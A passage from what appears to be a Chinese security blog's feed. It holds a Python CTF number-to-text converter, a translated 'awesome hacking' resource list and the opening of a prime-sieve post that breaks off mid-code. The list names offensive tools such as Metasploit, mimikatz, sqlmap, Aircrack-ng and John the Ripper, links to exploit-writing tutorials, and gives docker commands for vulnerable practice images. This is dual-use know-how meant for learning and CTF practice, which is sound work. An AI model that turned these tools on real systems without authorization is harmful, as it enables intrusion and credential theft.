class="number">103</span>, <span class="number">256</span>):</div><div class="line">        filter_char.append(chr(num))</div><div class="line">    filter_char.append(<span class="string">'0x'</span>, <span class="string">'0X'</span>, <span class="string">'0b'</span>, <span class="string">'0B'</span>)</div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> filter_char:</div><div class="line">        data = data.replace(char, <span class="string">''</span>)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_detect</span><span class="params">(num_str)</span>:</span></div><div class="line">    hexadecimal_feature = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>]</div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> hexadecimal_feature:</div><div class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> num_str:</div><div class="line">            print(<span class="string">'[*] You may enter a hexadecimal numeric string.'</span>)</div><div class="line">            <span class="keyword">return</span> <span class="number">16</span></div><div class="line">    <span class="keyword">if</span> max(num_str) == <span class="string">'1'</span>:</div><div class="line">        print(<span class="string">'[*] You may enter a binary numeric string.'</span>)</div><div class="line">        <span class="keyword">return</span> <span class="number">2</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">'[*] You may enter a decimal numeric string.'</span>)</div><div class="line">        <span class="keyword">return</span> <span class="number">10</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_to_text</span><span class="params">(num_str)</span>:</span></div><div class="line">    lens = len(num_str)</div><div class="line">    text = <span class="string">''</span></div><div class="line">    count = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> count &lt; lens:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            text += chr(int(num_str[:<span class="number">8</span>], <span class="number">2</span>))</div><div class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">            print_error()</div><div class="line">        count += <span class="number">8</span></div><div class="line">        num_str = num_str[<span class="number">8</span>:]</div><div class="line">    print(<span class="string">'[&gt;] Output convert result:%s'</span> %text)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decimal_to_text</span><span class="params">(num_str)</span>:</span></div><div class="line">    lens = len(num_str)</div><div class="line">    text = <span class="string">''</span></div><div class="line">    count = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> count &lt; lens:</div><div class="line">        <span class="keyword">if</span> int(num_str[:<span class="number">2</span>]) &gt;= <span class="number">32</span> <span class="keyword">and</span> int(num_str[:<span class="number">2</span>]) &lt;= <span class="number">126</span>:</div><div class="line">            text += chr(int(num_str[:<span class="number">2</span>]))</div><div class="line">            count += <span class="number">2</span></div><div class="line">            num_str = num_str[<span class="number">2</span>:]</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">elif</span> int(num_str[:<span class="number">3</span>]) &gt;= <span class="number">32</span> <span class="keyword">and</span> int(num_str[:<span class="number">3</span>]) &lt;= <span class="number">126</span>:</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                text += chr(int(num_str[:<span class="number">3</span>]))</div><div class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                print_error()</div><div class="line">            count += <span class="number">3</span></div><div class="line">            num_str = num_str[<span class="number">3</span>:]</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            print_error()</div><div class="line">    print(<span class="string">'[&gt;] Output convert result:%s'</span> %text)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexadecimal_to_text</span><span class="params">(num_str)</span>:</span></div><div class="line">    lens = len(num_str)</div><div class="line">    <span class="keyword">if</span> lens % <span class="number">2</span> != <span class="number">0</span>:</div><div class="line">        print_error()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        text = num_str.decode(<span class="string">'hex'</span>)</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        print_error()</div><div class="line">    print(<span class="string">'[&gt;] Output convert result:%s'</span> %text)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    num_str = input_filter()</div><div class="line">    det_res = input_detect(num_str)</div><div class="line">    <span class="keyword">if</span> det_res == <span class="number">2</span>:</div><div class="line">        binary_to_text(num_str)</div><div class="line">    <span class="keyword">if</span> det_res == <span class="number">10</span>:</div><div class="line">        decimal_to_text(num_str)</div><div class="line">    <span class="keyword">if</span> det_res == <span class="number">16</span>:</div><div class="line">        hexadecimal_to_text(num_str)</div><div class="line">    </div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      #0X00-前言0X00 前言
CTF常用到数字串转字符串，也有许多在线的网站支持转换，不过要求这样或那样的格式要求，所以就动手写了一个自动识别转换的脚本，下载地址github
[https://github.com/sunnyelf/auto_num_str_to_text]。

下面是演示截图：
    
    </summary>
    
      <category term="CTF" scheme="https://sunnyelf.github.io/categories/CTF/"/>
    
    
      <category term="ctf" scheme="https://sunnyelf.github.io/tags/ctf/"/>
    
      <category term="python" scheme="https://sunnyelf.github.io/tags/python/"/>
    
      <category term="数字串转字符串" scheme="https://sunnyelf.github.io/tags/%E6%95%B0%E5%AD%97%E4%B8%B2%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>超棒黑客必备清单</title>
    <link href="https://sunnyelf.github.io/2017/04/07/%E8%B6%85%E6%A3%92%E9%BB%91%E5%AE%A2%E5%BF%85%E5%A4%87%E6%B8%85%E5%8D%95/"/>
    <id>https://sunnyelf.github.io/2017/04/07/超棒黑客必备清单/</id>
    <published>2017-04-06T22:58:00.000Z</published>
    <updated>2017-10-02T19:22:31.607Z</updated>
    
    <content type="html"><![CDATA[<h1 id="超棒黑客必备清单"><a href="#超棒黑客必备清单" class="headerlink" title="超棒黑客必备清单 "></a>超棒黑客必备清单 <a href="https://github.com/sindresorhus/awesome" target="_blank" rel="external"><img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg" alt="Awesome"></a></h1><p><a href="https://github.com/carpedm20/awesome-hacking" target="_blank" rel="external">English Version</a></p><p>一份精美的黑客必备表单,灵感来自于<a href="https://github.com/josephmisiti/awesome-machine-learning/" target="_blank" rel="external">超棒的机器学习</a>，如果您想为此列表做出贡献（欢迎），请在github给我一个pull或联系我<a href="https://twitter.com/carpedm20" target="_blank" rel="external">@carpedm20</a>，有关可供下载的免费黑客书籍列表，请点击<a href="https://github.com/Hack-with-Github/Free-Security-eBooks" target="_blank" rel="external">此处</a>。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li><a href="#系统方面">系统方面</a><ul><li><a href="#教程">教程</a></li><li><a href="#工具">工具</a></li><li><a href="#docker">Docker</a></li><li><a href="#常用">常用</a></li></ul></li><li><a href="#逆向方面">逆向方面</a><ul><li><a href="#教程">教程</a></li><li><a href="#工具">工具</a></li><li><a href="#常用">常用</a></li></ul></li><li><a href="#web">Web方面</a><ul><li><a href="#教程">教程</a></li><li><a href="#工具">工具</a></li></ul></li><li><a href="#网络方面">网络方面</a><ul><li><a href="#教程">教程</a></li><li><a href="#工具">工具</a></li></ul></li><li><a href="#取证方面">取证方面</a><ul><li><a href="#教程">教程</a></li><li><a href="#工具">工具</a></li></ul></li><li><a href="#密码方面">密码方面</a><ul><li><a href="#教程">教程</a></li><li><a href="#工具">工具</a></li></ul></li><li><a href="#wargame方面">Wargame方面</a><ul><li><a href="#系统">系统</a></li><li><a href="#逆向工程">逆向工程</a></li><li><a href="#web">Web</a></li><li><a href="#网络">网络</a></li><li><a href="#取证">取证</a></li><li><a href="#密码学">密码学</a></li></ul></li><li><a href="#ctf">CTF方面</a><ul><li><a href="#比赛">比赛</a></li><li><a href="#常用">常用</a></li></ul></li><li><a href="#os安全方面">OS安全方面</a><ul><li><a href="#在线资源">在线资源</a></li></ul></li><li><a href="#其他">其他</a></li></ul><a id="more"></a><h1 id="系统方面"><a href="#系统方面" class="headerlink" title="系统方面"></a>系统方面</h1><h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><ul><li><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="external">Corelan团队的Exploit写作教程</a></li><li><a href="http://www.punter-infosec.com/exploit-writing-tutorials-for-pentesters/" target="_blank" rel="external">为渗透测试员开发的Exploit写作教程</a></li></ul><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external">Metasploit</a> - 一个计算机安全项目，提供有关安全漏洞的信息，并帮助进行渗透测试和入侵检测系统开发。</li><li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="external">mimikatz</a> - 一个玩Windows安全有用的工具</li></ul><h3 id="有关渗透测试和安全方面的Docker镜像"><a href="#有关渗透测试和安全方面的Docker镜像" class="headerlink" title="有关渗透测试和安全方面的Docker镜像"></a>有关渗透测试和安全方面的Docker镜像</h3><ul><li><code>docker pull kalilinux/kali-linux-docker</code> <a href="https://hub.docker.com/r/kalilinux/kali-linux-docker/" target="_blank" rel="external">official Kali Linux</a></li><li><code>docker pull owasp/zap2docker-stable</code> - <a href="https://github.com/zaproxy/zaproxy" target="_blank" rel="external">official OWASP ZAP</a></li><li><code>docker pull wpscanteam/wpscan</code> - <a href="https://hub.docker.com/r/wpscanteam/wpscan/" target="_blank" rel="external">official WPScan</a></li><li><code>docker pull pandrew/metasploit</code> - <a href="https://hub.docker.com/r/pandrew/metasploit/" target="_blank" rel="external">docker-metasploit</a></li><li><code>docker pull citizenstig/dvwa</code> - <a href="https://hub.docker.com/r/citizenstig/dvwa/" target="_blank" rel="external">Damn Vulnerable Web Application (DVWA)</a></li><li><code>docker pull wpscanteam/vulnerablewordpress</code> - <a href="https://hub.docker.com/r/wpscanteam/vulnerablewordpress/" target="_blank" rel="external">Vulnerable WordPress Installation</a></li><li><code>docker pull hmlio/vaas-cve-2014-6271</code> - <a href="https://hub.docker.com/r/hmlio/vaas-cve-2014-6271/" target="_blank" rel="external">Vulnerability as a service: Shellshock</a></li><li><code>docker pull hmlio/vaas-cve-2014-0160</code> - <a href="https://hub.docker.com/r/hmlio/vaas-cve-2014-0160/" target="_blank" rel="external">Vulnerability as a service: Heartbleed</a></li><li><code>docker pull opendns/security-ninjas</code> - <a href="https://hub.docker.com/r/opendns/security-ninjas/" target="_blank" rel="external">Security Ninjas</a></li><li><code>docker pull usertaken/archlinux-pentest-lxde</code> - <a href="https://hub.docker.com/r/usertaken/archlinux-pentest-lxde/" target="_blank" rel="external">Arch Linux Penetration Tester</a></li><li><code>docker pull diogomonica/docker-bench-security</code> - <a href="https://hub.docker.com/r/diogomonica/docker-bench-security/" target="_blank" rel="external">Docker Bench for Security</a></li><li><code>docker pull ismisepaul/securityshepherd</code> - <a href="https://hub.docker.com/r/ismisepaul/securityshepherd/" target="_blank" rel="external">OWASP Security Shepherd</a></li><li><code>docker pull danmx/docker-owasp-webgoat</code> - <a href="https://hub.docker.com/r/danmx/docker-owasp-webgoat/" target="_blank" rel="external">OWASP WebGoat Project docker image</a></li><li><code>docker-compose build &amp;&amp; docker-compose up</code> - <a href="https://github.com/owasp/nodegoat#option-3---run-nodegoat-on-docker" target="_blank" rel="external">OWASP NodeGoat</a></li><li><code>docker pull citizenstig/nowasp</code> - <a href="https://hub.docker.com/r/citizenstig/nowasp/" target="_blank" rel="external">OWASP Mutillidae II Web Pen-Test Practice Application</a></li><li><code>docker pull bkimminich/juice-shop</code> - <a href="https://github.com/bkimminich/juice-shop#docker-container--" target="_blank" rel="external">OWASP Juice Shop</a></li></ul><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><ul><li><a href="https://www.exploit-db.com/" target="_blank" rel="external">Exploit database</a> - 漏洞利用和易受攻击软件的终极存档库</li></ul><h1 id="逆向方面"><a href="#逆向方面" class="headerlink" title="逆向方面"></a>逆向方面</h1><h2 id="教程-1"><a href="#教程-1" class="headerlink" title="教程"></a>教程</h2><ul><li><a href="https://tuts4you.com/download.php?list.17" target="_blank" rel="external">逆转新手</a></li><li><a href="http://fumalwareanalysis.blogspot.kr/p/malware-analysis-tutorials-reverse.html" target="_blank" rel="external">恶意软件分析教程：逆向工程</a></li></ul><h2 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="https://github.com/lorenzoongithub/nudge4j" target="_blank" rel="external">nudge4j</a> - 让浏览器与JVM交互的Java工具</li><li><a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="external">IDA</a> - IDA是可以工作在Windows，Linux或Mac OS X的多处理反汇编和调试工具</li><li><a href="http://www.ollydbg.de/" target="_blank" rel="external">OllyDbg</a> - Windows 32位汇编程序级别调试工具</li><li><a href="http://x64dbg.com/" target="_blank" rel="external">x64dbg</a> - Windows上开源x64/x32调试工具</li><li><a href="https://github.com/pxb1988/dex2jar" target="_blank" rel="external">dex2jar</a> - 用于处理用于处理Android .dex和Java .class文件的工具</li><li><a href="http://jd.benow.ca/" target="_blank" rel="external">JD-GUI</a> - 显示Java源代码“.class”文件的独立图形实用工具</li><li><a href="https://bitbucket.org/mstrobel/procyon/wiki/Java%20Decompiler" target="_blank" rel="external">procyon</a> - 现代化开源Java反编译工具</li><li><a href="https://code.google.com/p/androguard/" target="_blank" rel="external">androguard</a> - 用于Android应用程序的逆向工程，恶意软件分析工具</li><li><a href="http://varaneckas.com/jad/" target="_blank" rel="external">JAD</a> - JAD Java反编译工具(闭源, 不常更新)</li><li><a href="https://www.jetbrains.com/decompiler/" target="_blank" rel="external">dotPeek</a> - JetBrains公司开发的免费的.NET反编译工具</li><li><a href="https://github.com/icsharpcode/ILSpy/" target="_blank" rel="external">ILSpy</a> - 开源的集浏览和反编译.NET程序工具</li><li><a href="https://github.com/0xd4d/dnSpy" target="_blank" rel="external">dnSpy</a> - 集编辑，反编译和调试.NET程序工具</li><li><a href="https://github.com/0xd4d/de4dot" target="_blank" rel="external">de4dot</a> - 破解.NET程序工具</li><li><a href="https://github.com/0xd4d/antinet" target="_blank" rel="external">antinet</a> - 用于反编译和混淆代码的.NET程序工具</li><li><a href="http://upx.sourceforge.net/" target="_blank" rel="external">UPX</a> - 终极封装可执行文件工具</li><li><a href="https://github.com/radare/radare2" target="_blank" rel="external">radare2</a> - 便携式的逆向工程框架工具</li><li><a href="https://github.com/joelpx/plasma" target="_blank" rel="external">plasma</a> - 适用于x86/ARM/MIPS交互式反汇编，使用花指令语法代码生成伪代码。</li><li><a href="https://www.hopperapp.com" target="_blank" rel="external">Hopper</a> - 适用于OS X和Linux反汇编/反编译32/64位Windows/MAC/LINUX/iOS的可执行文件工具</li><li><a href="https://github.com/pfalcon/ScratchABit" target="_blank" rel="external">ScratchABit</a> - 使用IDAPython兼容插件API轻松重新定位和可攻击的交互式反汇编工具</li></ul><h2 id="常用-1"><a href="#常用-1" class="headerlink" title="常用"></a>常用</h2><ul><li><a href="http://www.offensivecomputing.net/" target="_blank" rel="external">开放的恶意软件查询</a></li></ul><h1 id="Web方面"><a href="#Web方面" class="headerlink" title="Web方面"></a>Web方面</h1><h2 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="external">sqlmap</a> - 自动SQL注入和数据库入侵工具</li><li><a href="http://tools.web-max.ca/encode_decode.php" target="_blank" rel="external">tools.web-max.ca</a> - base64，base85编码/解码</li></ul><h1 id="网络方面"><a href="#网络方面" class="headerlink" title="网络方面"></a>网络方面</h1><h2 id="工具-3"><a href="#工具-3" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="https://www.wireshark.org/" target="_blank" rel="external">Wireshark</a> - 免费开源的流量包分析工具</li><li><a href="http://www.netresec.com/?page=NetworkMiner" target="_blank" rel="external">NetworkMiner</a> - 网络取证分析工具</li><li><a href="http://www.tcpdump.org/" target="_blank" rel="external">tcpdump</a> - 功能强大的命令行流量包分析工具，自带的libpcap用于网络流量捕获的便携式C/C++库</li><li><a href="http://sourceforge.net/projects/paros/" target="_blank" rel="external">Paros</a> - 基于Java的HTTP/HTTPS代理用于评估Web应用程序漏洞工具</li><li><a href="https://github.com/rafael-santiago/pig" target="_blank" rel="external">pig</a> - Linux下伪造流量包工具</li><li><a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project" target="_blank" rel="external">ZAP</a> - ZAP是用于发现Web应用程序中漏洞易于使用的集成式渗透测试工具</li><li><a href="https://mitmproxy.org/" target="_blank" rel="external">mitmproxy</a> - 基于HTTP具有交互式控制界面并支持SSL中间代理的工具</li><li><a href="https://github.com/Akdeniz/mitmsocks4j" target="_blank" rel="external">mitmsocks4j</a> - 基于Java支持中间SOCKS代理工具</li><li><a href="https://nmap.org/" target="_blank" rel="external">nmap</a> - Nmap安全扫描工具</li><li><a href="http://www.aircrack-ng.org/" target="_blank" rel="external">Aircrack-ng</a> - 用于破解802.11 WEP和WPA-PSK密钥工具</li><li><a href="https://charlesproxy.com" target="_blank" rel="external">Charles Proxy</a> - 用于查看截获的HTTP和HTTPS/SSL实时流量的跨平台图形化用户界面Web调试代理工具</li><li><a href="https://github.com/GouveaHeitor/nipe" target="_blank" rel="external">Nipe</a> - 使Tor网络成为默认网关的脚本</li></ul><h1 id="取证方面"><a href="#取证方面" class="headerlink" title="取证方面"></a>取证方面</h1><h2 id="工具-4"><a href="#工具-4" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="http://www.sleuthkit.org/autopsy/" target="_blank" rel="external">Autospy</a> - 数字取证平台，<a href="http://www.sleuthkit.org/sleuthkit/index.php" target="_blank" rel="external">The Sleuth Kit</a>的图形界面，还包含其他数字取证工具。</li><li><a href="https://github.com/sleuthkit/sleuthkit" target="_blank" rel="external">sleuthkit</a> - 收集各种命令行数字取证工具库</li><li><a href="https://www.guidancesoftware.com/products/Pages/encase-forensic/overview.aspx" target="_blank" rel="external">EnCase</a> - Guidance Software开发的一套使用共享技术数字取证工具</li><li><a href="http://malzilla.sourceforge.net/" target="_blank" rel="external">malzilla</a> - 恶意软件抓捕工具</li><li><a href="http://wjradburn.com/software/" target="_blank" rel="external">PEview</a> - 快速简便查看程序结构和32位可移植可执行文件（PE）以及组件对象文件格式（COFF）文件的内容</li><li><a href="http://mh-nexus.de/en/hxd/" target="_blank" rel="external">HxD</a> - 十六进制编辑器，除了主存储器（RAM）的原始磁盘编辑和修改之外，可以处理任何大小的文件。</li><li><a href="http://www.winhex.com/winhex/" target="_blank" rel="external">WinHex</a> - 十六进制编辑器，有助于计算机取证，数据恢复，低级数据处理和IT安全领域。</li><li><a href="http://www.mcafee.com/kr/downloads/free-tools/bintext.aspx" target="_blank" rel="external">BinText</a> - 一个小而快强大的文本提取器，程序员特别感兴趣。</li></ul><h1 id="密码方面"><a href="#密码方面" class="headerlink" title="密码方面"></a>密码方面</h1><h3 id="工具-5"><a href="#工具-5" class="headerlink" title="工具"></a>工具</h3><ul><li><a href="https://github.com/hellman/xortool" target="_blank" rel="external">xortool</a> - 一种分析多字节XOR密码工具</li><li><a href="http://www.openwall.com/john/" target="_blank" rel="external">John the Ripper</a> - 快速密码破解工具</li><li><a href="http://www.aircrack-ng.org/" target="_blank" rel="external">Aircrack</a> - 802.11 WEP和WPA-PSK密钥破解工具</li></ul><h1 id="Wargame方面"><a href="#Wargame方面" class="headerlink" title="Wargame方面"></a>Wargame方面</h1><h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><ul><li><a href="http://overthewire.org/wargames/semtex/" target="_blank" rel="external">OverTheWire - Semtex</a></li><li><a href="http://overthewire.org/wargames/vortex/" target="_blank" rel="external">OverTheWire - Vortex</a></li><li><a href="http://overthewire.org/wargames/drifter/" target="_blank" rel="external">OverTheWire - Drifter</a></li><li><a href="http://pwnable.kr/" target="_blank" rel="external">pwnable.kr</a> - 提供有关系统安全性的各种pwn挑战</li><li><a href="https://exploit-exercises.com/nebula/" target="_blank" rel="external">Exploit Exercises - Nebula</a></li><li><a href="http://smashthestack.org/" target="_blank" rel="external">SmashTheStack</a></li></ul><h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><ul><li><a href="http://www.reversing.kr/" target="_blank" rel="external">Reversing.kr</a></li><li><a href="http://codeengn.com/challenges/" target="_blank" rel="external">CodeEngn</a></li><li><a href="http://simples.kr/" target="_blank" rel="external">simples.kr</a></li><li><a href="http://crackmes.de/" target="_blank" rel="external">Crackmes.de</a></li></ul><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><ul><li><a href="https://www.hackthissite.org/" target="_blank" rel="external">Hack This Site!</a></li><li><a href="http://webhacking.kr/" target="_blank" rel="external">Webhacking.kr</a></li><li><a href="https://0xf.at/" target="_blank" rel="external">0xf.at</a></li></ul><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><ul><li><a href="http://overthewire.org/wargames/krypton/" target="_blank" rel="external">OverTheWire - Krypton</a></li></ul><h1 id="CTF方面"><a href="#CTF方面" class="headerlink" title="CTF方面"></a>CTF方面</h1><h2 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h2><ul><li><a href="https://legitbs.net/" target="_blank" rel="external">DEF CON</a></li><li><a href="https://ctf.isis.poly.edu/" target="_blank" rel="external">CSAW CTF</a></li><li><a href="http://hack.lu/" target="_blank" rel="external">hack.lu CTF</a></li><li><a href="http://www.plaidctf.com/" target="_blank" rel="external">Pliad CTF</a></li><li><a href="http://ructf.org/e/" target="_blank" rel="external">RuCTFe</a></li><li><a href="http://ghostintheshellcode.com/" target="_blank" rel="external">Ghost in the Shellcode</a></li><li><a href="http://www.phdays.com/" target="_blank" rel="external">PHD CTF</a></li><li><a href="http://secuinside.com/" target="_blank" rel="external">SECUINSIDE CTF</a></li><li><a href="http://ctf.codegate.org/html/Main.html?lang=eng" target="_blank" rel="external">Codegate CTF</a></li><li><a href="http://bostonkeyparty.net/" target="_blank" rel="external">Boston Key Party CTF</a></li></ul><h2 id="常用-2"><a href="#常用-2" class="headerlink" title="常用"></a>常用</h2><ul><li><a href="https://ctftime.org/" target="_blank" rel="external">CTFtime.org</a></li><li><a href="http://www.wechall.net/" target="_blank" rel="external">WeChall</a></li><li><a href="http://shell-storm.org/repo/CTF/" target="_blank" rel="external">CTF archives (shell-storm)</a></li><li><a href="https://amzn.com/144962636X" target="_blank" rel="external">Rookit Arsenal</a></li><li><a href="https://github.com/coreb1t/awesome-pentest-cheat-sheets" target="_blank" rel="external">Pentest Cheat Sheets</a> - 渗透测试方面的干货</li><li><a href="https://github.com/k4m4/movies-for-hackers" target="_blank" rel="external">Movies For Hacker</a> - 每个黑客必须看的电影清单</li></ul><h1 id="OS安全方面"><a href="#OS安全方面" class="headerlink" title="OS安全方面"></a>OS安全方面</h1><h2 id="在线资源"><a href="#在线资源" class="headerlink" title="在线资源"></a>在线资源</h2><ul><li><a href="http://rawsec.ml/en/security-related-os/" target="_blank" rel="external">Security related Operating Systems @ Rawsec</a> - 完整的有关操作系统安全表单</li><li><a href="https://n0where.net/best-linux-penetration-testing-distributions/" target="_blank" rel="external">Best Linux Penetration Testing Distributions @ CyberPunk</a> - 渗透测试分工说明</li><li><a href="http://distrowatch.com/search.php?category=Security" target="_blank" rel="external">Security @ Distrowatch</a> - 致力于讨论，审核和保持更新开源操作系统的网站</li></ul><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul><li><a href="http://sectools.org/" target="_blank" rel="external">SecTools</a> - 前125名网络安全工具</li></ul>]]></content>
    
    <summary type="html">
    
      #超棒黑客必备清单超棒黑客必备清单 AWESOME
[HTTPS://CDN.RAWGIT.COM/SINDRESORHUS/AWESOME/D7305F38D29FED78FA85652E3A63E154DD8E8829/MEDIA/BADGE.SVG]
[HTTPS://GITHUB.COM/SINDRESORHUS/AWESOME]
English Version [https://github.com/carpedm20/awesome-hacking]

一份精美的黑客必备表单,灵感来自于超棒的机器学习
[https://github.com/josephmisiti/awesome-machine-learning/]
，如果您想为此列表做出贡献（欢迎），请在github给我一个pull或联系我@carpedm20 [https://twitter.com/carpedm20]
，有关可供下载的免费黑客书籍列表，请点击此处
[https://github.com/Hack-with-Github/Free-Security-eBooks]。

#目录目录
 * 系统方面 * 教程
    * 工具
    * Docker
    * 常用
   
   
 * 逆向方面 * 教程
    * 工具
    * 常用
   
   
 * Web方面 * 教程
    * 工具
   
   
 * 网络方面 * 教程
    * 工具
   
   
 * 取证方面 * 教程
    * 工具
   
   
 * 密码方面 * 教程
    * 工具
   
   
 * Wargame方面 * 系统
    * 逆向工程
    * Web
    * 网络
    * 取证
    * 密码学
   
   
 * CTF方面 * 比赛
    * 常用
   
   
 * OS安全方面 * 在线资源
   
   
 * 其他
    
    </summary>
    
      <category term="干货分享" scheme="https://sunnyelf.github.io/categories/%E5%B9%B2%E8%B4%A7%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="ctf" scheme="https://sunnyelf.github.io/tags/ctf/"/>
    
      <category term="渗透测试" scheme="https://sunnyelf.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="取证" scheme="https://sunnyelf.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
      <category term="黑客" scheme="https://sunnyelf.github.io/tags/%E9%BB%91%E5%AE%A2/"/>
    
      <category term="密码" scheme="https://sunnyelf.github.io/tags/%E5%AF%86%E7%A0%81/"/>
    
      <category term="工具" scheme="https://sunnyelf.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="逆向工程" scheme="https://sunnyelf.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
      <category term="系统安全" scheme="https://sunnyelf.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>python实现基于埃拉托斯特尼筛法快速生成素数的优化</title>
    <link href="https://sunnyelf.github.io/2017/03/26/python%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%E5%9F%83%E6%8B%89%E6%89%98%E6%96%AF%E7%89%B9%E5%B0%BC%E7%AD%9B%E6%B3%95%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%E7%B4%A0%E6%95%B0%E7%9A%84%E4%BC%98%E5%8C%96/"/>
    <id>https://sunnyelf.github.io/2017/03/26/python实现基于埃拉托斯特尼筛法快速生成素数的优化/</id>
    <published>2017-03-26T05:55:00.000Z</published>
    <updated>2017-10-02T19:22:31.903Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-埃拉托斯特尼筛法"><a href="#0x00-埃拉托斯特尼筛法" class="headerlink" title="0x00 埃拉托斯特尼筛法"></a>0x00 埃拉托斯特尼筛法</h2><p><a href="http://baike.baidu.com/item/%E5%9F%83%E6%8B%89%E6%89%98%E6%96%AF%E7%89%B9%E5%B0%BC%E7%AD%9B%E6%B3%95" target="_blank" rel="external">埃拉托斯特尼筛法</a>，也就是我们常说的素数筛选法的一种方法：</p><p><img src="http://i.imgur.com/tm7E388.gif" alt=""></p><h2 id="0x02-优化"><a href="#0x02-优化" class="headerlink" title="0x02 优化"></a>0x02 优化</h2><p>使用了python的生成器方法生成一个超大的字典，这样做的方法是为了减少内存的消耗，循环只需到n的平方根square_root就行了，然后测试一下，最大的8位数基本40s能求出所有质因子。用到一些小优化，在python 2 中<code>while 1：</code>要比<code>while True：</code>要快，<code>if value：</code>要比<code>if value == True：</code>，不相信的话可以测试一下，然后看一下它们生成的操作码，另外大数计算中最好不用<code>for</code>循环，而用<code>while</code>循环。</p><h2 id="0x02-实现"><a href="#0x02-实现" class="headerlink" title="0x02 实现"></a>0x02 实现</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="comment"># author:admin[@hackfun.org]</span></div><div class="line"><span class="comment"># license:GPL v3</span></div><div class="line"><span class="comment"># blog:hackfun.org</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_super_dict</span><span class="params">(n)</span>:</span></div><div class="line">    <span class="string">"""use python generator to generate super dictionary and save memory"""</span></div><div class="line">    i = <span class="number">2</span> <span class="comment"># 0 and 